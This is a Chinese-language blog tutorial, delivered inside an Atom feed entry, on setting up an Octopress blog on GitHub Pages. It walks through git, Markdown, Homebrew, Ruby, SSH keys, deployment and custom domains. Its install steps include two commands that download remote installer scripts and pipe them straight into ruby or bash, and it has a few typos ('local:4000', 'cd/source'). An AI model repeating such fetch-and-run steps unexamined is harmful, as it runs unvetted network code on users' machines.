&lt;pre&gt;&lt;code&gt;error: failed to push some refs to  &amp;apos;https://myusername@bitbucket.org/repo_user/repo_name.git&amp;apos; hint: Updates were rejected because the remote contains  workthat you do not have locally. 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;至于为什么，可以等你读了下文熟悉了git基本原理之后再去深究。如果你只想快速安全的创建好自己的博客，就直接跳过&lt;em&gt;readme&lt;/em&gt; 文件吧，当然，如果你很熟悉git原理以及用法，你可以随意折腾。&lt;/p&gt;
&lt;p&gt;什么是git ?  一看名字，就知道它一定与github有关，不错，简单来说，git就是github上的一个分布式版本控制系统，github的协同管理靠的就是git技术，谁创造了这个伟大的git系统？ 是计算机天才Linus! &lt;/p&gt;
&lt;p&gt;使用git，则不存在中央服务器，每个人的电脑上都有一个完整的版本库，团队协同工作的时候，只需把各自的修改发送给对方就行了，git能帮你记录所有的修改记录，不管是对管理修改，撤销修改，git都能帮你实现这一切，它能让你时光倒流！ 假如你将本地仓库新增的文件同步到github 仓库中，只需要执行以下命令:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir yourgit
cd yourgit
git init %创建本地仓库; 
git add newfilename 
git commit -m &amp;quot;Revise message&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其它与git操作相关的更详细操作，大家可以参考git教程博客 &lt;/p&gt;
&lt;p&gt;好，回到本文主题，既然是Octopress + Github  pages     创建博客，你电脑上首先得安装git系统，这些准备工作全都放在下文的新手上路这一节中来讲解。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;了解markdown&quot;&gt;&lt;a href=&quot;#了解markdown&quot; class=&quot;headerlink&quot; title=&quot;了解markdown&quot;&gt;&lt;/a&gt;了解markdown&lt;/h2&gt;&lt;p&gt;Markdown 是一种方便记忆、书写的纯文本标记语言，用户可以使用这些标记符号以最小的输入代价生成极富表现力的文档。在Octopress中写的每一篇博文都是以&lt;code&gt;.markdown&lt;/code&gt;为后缀命名。因此，要写好每一篇博文，还得熟悉markdown语言的语法，好在这些语法都非常简单，容易上手。推荐大家使用markdown编辑器如Cmd markdown, Mou, 这些编辑器都是所见即所得，大家可以在编辑器上写好自己的博文，导出成markdown各式的文件，再将&lt;code&gt;.markdown&lt;/code&gt;文件拷贝进&lt;code&gt;/octopress/source/_posts&lt;/code&gt;文件夹中，后续相关部署问题参见下文。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;新手上路&quot;&gt;&lt;a href=&quot;#新手上路&quot; class=&quot;headerlink&quot; title=&quot;新手上路&quot;&gt;&lt;/a&gt;新手上路&lt;/h2&gt;&lt;p&gt;好了，说了那么多废话，现在终于可以正式上手了，有点小兴奋！本文基于Mac OS搭建，其它操作系统Windows, Linux大同小异。&lt;/p&gt;
&lt;p&gt;在安装Octopress前，先确保电脑中已经安装好以下软件： &lt;code&gt;Homebrew&lt;/code&gt;, &lt;code&gt;Git&lt;/code&gt;, &lt;code&gt;Ruby1.93+&lt;/code&gt;.&lt;br&gt;Homebrew是Max OS的软件包管理工具，可以用它来安装ruby或其它软件，类似于linux下的&lt;code&gt;apt-get&lt;/code&gt;, &lt;code&gt;yum&lt;/code&gt;等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装Homebrew&lt;/strong&gt;: Homebrew安装很简单，打开你的终端Terminal输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby -e &amp;quot;$(curl -fsSL https://raw.github.com/Homebrew/homebrew/go/install)&amp;quot;       
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果在执行命令的过程中提示需要安装Xcode command line tools ，按照要求安装即可。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装Ruby&lt;/strong&gt;: Mac OS自带Ruby,可以使用命令 &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby --version 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看ruby的版本是否符合要求，大于1.93即可，否则使用RVM安装Ruby,执行以下命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -L https://get.rvm.io | bash -s stable --ruby。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;安装git&lt;/strong&gt;: &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;brew install git
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;即可，注意brew命令是在系统已经安装homebrew基础上进行的，也可进入git官网直接安装git，这里不再详细赘述。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装Octopress&lt;/strong&gt;: 在以上软件都已经成功安装之后，将Octopress克隆到本地&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone git://github.com/imathis/octopress.git octopress 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行此命令之后，就可以cd octopress文件夹看到octopress里面的所有文件了，可以大致先看看里面的东西之后再摸索下一步的操作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装octopress依赖项&lt;/strong&gt;： &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gem install bundler
bundle install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;到此与octopress相关的基本依赖都安装好了，期间如果遇到permission相关权限不足的错误请在每条命令前面加上sudo,本文之后的所以命令也如此， 稍微了解一点linux知识的应该都明白sudo的含义。&lt;br&gt;octopress源码安装到本地后，可以先安装默认主题在本地预览一下效果，执行 &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rake install
rake preview 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里 &lt;em&gt;rake&lt;/em&gt; 是 &lt;em&gt;ruby + make&lt;/em&gt; 的简写，由于octopress框架是基于ruby的，因此与octopress相关的安装命令都会用到rake。 &lt;/p&gt;
&lt;p&gt;octopress会绑定本地的&lt;code&gt;4000&lt;/code&gt;端口，在浏览器中输入&lt;code&gt;http://local:4000&lt;/code&gt;便可以预览博客在本地的效果。这是你会看到一个最基本的主页，看似好像什么都没有，但又什么都能有的感觉，因为好戏还在后头！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;部署Github-Pages&quot;&gt;&lt;a href=&quot;#部署Github-Pages&quot; class=&quot;headerlink&quot; title=&quot;部署Github Pages&quot;&gt;&lt;/a&gt;部署Github Pages&lt;/h2&gt;&lt;p&gt;如果你只是打算Octopress部署在本地，那之后的内容就没必要看了，但如果你仅仅是部署在本地，就失去了使用Octopress的意义了，何不用其他类似Evernote这种的笔记功能APP呢，在部署到github pages之前可以先在本地预览效果，觉得满意后再发布。&lt;/p&gt;
&lt;p&gt;部署Github Page实质上是一个利用git分布式系统处理的一个实际运用过程。回忆前文让大家创建的&lt;code&gt;username/username.github.io&lt;/code&gt;仓库，找到仓库的&lt;em&gt;ssh&lt;/em&gt; 协议&lt;em&gt;url&lt;/em&gt;, 就是类似&lt;code&gt;git@github.com:username/username.github.io.git&lt;/code&gt; 这样的一串字符，当然也可以找到&lt;code&gt;http://github.com/username/username/username.github.io&lt;/code&gt;这样的字符串，本文只介绍ssh协议url部署方式，&lt;em&gt;http&lt;/em&gt; 协议&lt;em&gt;url&lt;/em&gt;  绑定类似。让本地octopress与&lt;em&gt;username/username.github.io&lt;/em&gt; 关联，运行以下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rake setup_github_pages
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后会让你输入上文的&lt;em&gt;ssh&lt;/em&gt; 协议&lt;em&gt;url&lt;/em&gt; ，按照提示操作即可，在执行此代码之前，有必要介绍&lt;em&gt;ssh_key&lt;/em&gt;  的相关内容。&lt;/p&gt;
&lt;p&gt;既然github pages是个远程仓库，octopress要上传文件到github pages仓库中，必须有一个&lt;em&gt;key&lt;/em&gt;， 就像密码一样，因为github需要识别出你推送的提交文件确实是你推送的，不然岂不是任何人都能操作&lt;code&gt;username/username.github.io&lt;/code&gt;这个仓库了，因此，需要建立一个你本地octopress仓库到远程仓库的一个公钥&lt;em&gt;ssh key&lt;/em&gt;，如果你在多台电脑上部署了多个octopress，可以提交多个ssh key到github中，具体操作过程如下：&lt;/p&gt;
&lt;p&gt;首先，在本地创建&lt;em&gt;ssh key&lt;/em&gt;， 执行代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh-keygen -t rsa -C &amp;quot;youremail@example.com&amp;quot;   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意这里的email地址必须是你在github上注册时候用的email地址，之后按照提示一路回车即可创建一个&lt;em&gt;ssh key&lt;/em&gt;. 创建好之后可以在&lt;em&gt;~/.ssh&lt;/em&gt; 目录中看到&lt;code&gt;id_rsa&lt;/code&gt;和&lt;code&gt;id_rsa.pub&lt;/code&gt;这两个文件，&lt;code&gt;id_rsa&lt;/code&gt;是私钥，不要泄露出去，&lt;code&gt;id_rsa.pub&lt;/code&gt;是公钥，需要提交给github。&lt;/p&gt;
&lt;p&gt;之后在github主页上打开“&lt;code&gt;Account settings&lt;/code&gt;“中的”&lt;code&gt;SSH Keys&lt;/code&gt;“页面，点击”&lt;code&gt;Add SSH key&lt;/code&gt;“, 随便填写一个title，在Key的文本框中粘贴&lt;code&gt;id_rsa.pub&lt;/code&gt;文件中的所有内容然后保存即可。&lt;br&gt;到此为止，octopress已经与github pages绑定成功。&lt;/p&gt;
&lt;p&gt;再执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rake generate
rake deploy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后便可以使用&lt;code&gt;username.github.io&lt;/code&gt;访问你的博文了，现在全世界都能看到你的Blog! &lt;/p&gt;
&lt;p&gt;再说说两者之间绑定的原理，在执行&lt;code&gt;rake setup_github_pages&lt;/code&gt;命令之后，octopress文件夹中会多一个&lt;em&gt;_deploy&lt;/em&gt; 目录，在你未修改任何与octopress相关主题或者增加博文之前，里面只有一个&lt;code&gt;index.html&lt;/code&gt;文件，也就是默认主题的首页。里面的内容都是octopress源码编译之后生成的目标文件，&lt;em&gt;_deploy&lt;/em&gt; 目录被当做&lt;em&gt;master&lt;/em&gt;分支，请注意，在github中创建的&lt;code&gt;username/username.github.io&lt;/code&gt;仓库中也有一个默认称为&lt;em&gt;master&lt;/em&gt; 的分支，octopress仓库中除了&lt;em&gt;_deploy&lt;/em&gt; 目录外，其它都被octopress当做&lt;em&gt;source&lt;/em&gt; 分支，关于git技术中分支的概念，可自行查询前文git相关文档介绍。octopress的思想就是在&lt;em&gt;source&lt;/em&gt; 分支保存整个框架所需要的文件以及写的博文&lt;code&gt;.markdown&lt;/code&gt;文件，将每次生成的html文件全部放进&lt;em&gt;_deploy&lt;/em&gt;目录中，再将&lt;em&gt;_deploy&lt;/em&gt;目录所有的文件推送到github pages仓库中，这时便可通过&lt;code&gt;username.github.io&lt;/code&gt;访问到生成好的html文件，也就是&lt;em&gt;_deploy&lt;/em&gt;目录中的文件，至于其它&lt;em&gt;source&lt;/em&gt; 分支文件，也可以推送到github中备份，此过程不影响octopress的生成效果，只是防止本地文件丢失无法恢复带来的不良后果，可执行以下代码完成source分支的备份：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git add .
git commit -m &amp;apos;commit message&amp;apos;
git push origin source
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外，&lt;em&gt;rake generate&lt;/em&gt; 做的实质是把octopress框架生成的文件放进&lt;em&gt;octopress/public&lt;/em&gt; 文件夹中，&lt;em&gt;rake deploy&lt;/em&gt; 做的实质是将&lt;em&gt;octopress/public&lt;/em&gt; 中的文件拷贝到&lt;em&gt;octopress/_deploy&lt;/em&gt; 文件夹中并将其中的文件推送到&lt;em&gt;username.github.io&lt;/em&gt; 仓库中。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;绑定个性域名&quot;&gt;&lt;a href=&quot;#绑定个性域名&quot; class=&quot;headerlink&quot; title=&quot;绑定个性域名&quot;&gt;&lt;/a&gt;绑定个性域名&lt;/h2&gt;&lt;p&gt;用username.github.io这样的二级域名访问自己的博客好像感觉还是有点不对的样子，不满足，总会有解决的方法，绑定域名，专业点叫做域名解析。&lt;br&gt;首先你得有一个域名，如何申请域名这里不做具体介绍，有了域名之后，假设是&lt;code&gt;yourname.org&lt;/code&gt;，该如何将&lt;em&gt;yourname&lt;/em&gt;解析到&lt;em&gt;username.github.io&lt;/em&gt;上呢？ 首先本地目录&lt;em&gt;octopress/public/&lt;/em&gt;新建一个名为&lt;code&gt;CNAME&lt;/code&gt;的文件，文件内容写上&lt;em&gt;yourname.org&lt;/em&gt;, 在将octopress deploy到&lt;em&gt;username/username.github.io&lt;/em&gt;仓库中，之后在终端运行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ping username.github.io  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;找到&lt;code&gt;username.github.io&lt;/code&gt;的IP地址，将IP地址记录下来，之后登录到你购买域名的管理中心，找到域名解析的管理项，将此IP填进相对应的位置，具体细节不在本文范围之内，这里不再赘述，可自行参考域名解析相关文档。&lt;br&gt;至此，所有有关octopress + github pages的部署工作都已经完成了，接下来就是发布你的博文，技术，感悟，生活，anything you want, 做一个属于自己的hackers blog! &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;发布第一篇Hackers-Blog&quot;&gt;&lt;a href=&quot;#发布第一篇Hackers-Blog&quot; class=&quot;headerlink&quot; title=&quot;发布第一篇Hackers Blog&quot;&gt;&lt;/a&gt;发布第一篇Hackers Blog&lt;/h2&gt;&lt;p&gt;像黑客一样写博文，听起来就很兴奋。写新博文的命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rake new_post[&amp;quot;Post Title&amp;quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后会生成一个名为&lt;code&gt;yyyy-mm-dd-Post-Title.markdown&lt;/code&gt;的文件在&lt;code&gt;octopress/source/_posts&lt;/code&gt;目录中，yyyy为年份，mm为月份，dd为日子，然后可以切换到此目录，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd/source/_posts/ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;编辑此&lt;code&gt;.markdown&lt;/code&gt;文件，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;vim ***.markdown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果你很熟悉vim命令以及markdown语法，大可在此施展拳脚，编辑完文档保存后，执行命令 &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;rake gen_deploy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;便自动将博文发布到github pages中了，当然如果已经绑定了自己的域名，则可直接用域名访问刚发布的博文。Vim毕竟不是非IT人士很熟悉的编辑器，如果用户用的不太顺手，前文提过，推荐大家使用CMD MARKDOWN， Mou等工具进行编辑，之后再保存放到&lt;code&gt;/octopress/source/_posts&lt;/code&gt;文件夹中即可,这里注意，文件一定要以yyyy-mm-dd-post-title.markdown，否则无法识别此文件。第一篇博文发布完之后，大家可能对站点的界面或者主题并不满意，这时候就要你继续深入学习Octopress框架，自定义站点如添加页面、新增导航、添加小工具等等，自己个性化去吧，Octopress社区用户比较庞大，所以一般你想要自定义的功能在网上都能找到答案，这里就点到为止了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;希望本文能帮助到你，Enjoy your hackers blog!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后感谢我的好朋友邦宇的大力支持与帮助&lt;br&gt;Touch him at: &lt;li&gt; &lt;a href=&quot;http://yebangyu.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt; Bangyu’s Blog&lt;/a&gt;&lt;/li&gt; &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;  如转载本文请注明出处:&lt;a href=&quot;http://www.chongh.wiki/blog/2015/12/16/octopress-tutorial/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2015/12/16/octopress-tutorial/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 [新浪微博:&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;] &lt;/p&gt;
&lt;hr&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文是笔者加入Octopress blog之后发布的第一篇文章，主要讲解如何利用Octopress与Github Pages搭建一个黑客似的博客站点。目的有二，其一为了熟悉Octopress语法与发布过程，其二也想为新手们提供一点点帮助与建议。笔者会尽可能的讲解怎么做，为什么这么做，让大家尽快加入Hackers Blog阵营，记录自己的技术、生活与感悟，and anything you want.&lt;br&gt;如有不对的地方，还请批评指正。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;为什么选择Octopress + Github Pages&lt;/li&gt;
&lt;li&gt;了解Github Pages 与 Git&lt;/li&gt;
&lt;li&gt;了解Markdown&lt;/li&gt;
&lt;li&gt;新手上路&lt;/li&gt;
&lt;li&gt;安装Octopress&lt;/li&gt;
&lt;li&gt;部署Github Pages&lt;/li&gt;
&lt;li&gt;私人定制个性域名&lt;/li&gt;
&lt;li&gt;发布第一篇Hackers Blog&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Octopress" scheme="http://yoursite.com/tags/Octopress/"/>
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
      <category term="Github" scheme="http://yoursite.com/tags/Github/"/>
    
  </entry>
  
</feed>
